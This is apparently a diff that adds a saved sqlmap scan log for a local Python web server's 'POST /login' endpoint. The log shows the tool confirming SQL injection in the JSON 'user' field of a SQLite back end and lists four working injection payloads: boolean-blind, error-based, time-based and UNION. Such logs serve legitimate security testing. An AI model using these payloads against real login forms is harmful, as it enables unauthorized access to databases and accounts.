@@ -1,0 +1,155 @@
+# route: POST /login
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.11#pip}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:23:29 /2026-11-06/
+
+
+[21:23:30] [WARNING] using '/private/var/folders/_s/g4nt_jcx7mg0_g8v8nbbcrgr0000gn/T/tmpxjnyfohy' as the output directory
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+
+[21:23:30] [INFO] testing connection to the target URL
+
+[21:23:30] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.8.10')
+
+[21:23:30] [INFO] checking if the target is protected by some kind of WAF/IPS
+
+[21:23:30] [INFO] testing if the target URL content is stable
+
+[21:23:30] [INFO] target URL content is stable
+
+[21:23:30] [INFO] testing if (custom) POST parameter 'JSON user' is dynamic
+
+[21:23:30] [WARNING] (custom) POST parameter 'JSON user' does not appear to be dynamic
+
+[21:23:30] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON user' might be SQL injectable
+
+[21:23:30] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user'
+
+[21:23:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+
+[21:23:30] [WARNING] reflective value(s) found and filtering out
+
+[21:23:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+
+[21:23:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+
+[21:23:30] [INFO] (custom) POST parameter 'JSON user' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
+
+[21:23:37] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+
+[21:23:37] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+
+[21:23:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+
+[21:23:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+
+[21:23:38] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+
+[21:23:38] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+
+[21:23:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+
+[21:23:39] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+
+[21:23:39] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
+
+[21:23:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+
+[21:23:39] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
+
+[21:23:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+
+[21:23:40] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+
+[21:23:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
+
+[21:23:40] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'
+
+[21:23:40] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+
+[21:23:40] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+
+[21:23:40] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+
+[21:23:41] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+
+[21:23:41] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+
+[21:23:42] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'
+
+[21:23:42] [INFO] testing 'SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)'
+
+[21:23:42] [INFO] (custom) POST parameter 'JSON user' is 'SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)' injectable 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) value? [Y/n] Y
+
+[21:23:42] [INFO] testing 'Generic inline queries'
+
+[21:23:42] [INFO] testing 'SQLite inline queries'
+
+[21:23:42] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+
+[21:23:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+
+[21:23:42] [CRITICAL] unable to connect to the target URL
+
+[21:23:42] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+
+[21:23:58] [INFO] (custom) POST parameter 'JSON user' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+
+[21:23:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+
+[21:23:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+
+[21:23:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+
+[21:23:58] [INFO] target URL appears to have 2 columns in query
+
+[21:23:58] [INFO] (custom) POST parameter 'JSON user' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+
+[21:23:58] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+(custom) POST parameter 'JSON user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 4269 HTTP(s) requests:
+---
+Parameter: JSON user ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"user":"admin' OR NOT 9447=9447-- tOlh","pw":"x"}
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: {"user":"admin' AND 8786=JSON_EXTRACT(CHAR(123,125),CHAR(113,120,112,122,113)||(SELECT (CASE WHEN (8786=8786) THEN 1 ELSE 0 END))||CHAR(113,107,112,98,113))-- tlRL","pw":"x"}
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: {"user":"admin' AND 2550=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- UdMs","pw":"x"}
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: {"user":"admin' UNION ALL SELECT NULL,CHAR(113,120,112,122,113)||CHAR(76,82,102,100,82,119,109,117,100,102,76,119,68,70,108,68,122,99,109,118,86,82,116,116,103,110,104,85,103,70,77,79,80,72,112,80,71,75,73,79)||CHAR(113,107,112,98,113)-- XrBf","pw":"x"}
+---
+
+[21:23:58] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+
+[21:23:58] [INFO] fetched data logged to text files under '/private/var/folders/_s/g4nt_jcx7mg0_g8v8nbbcrgr0000gn/T/tmpxjnyfohy/127.0.0.1'
+
+[*] ending @ 21:23:58 /2026-11-06/
+
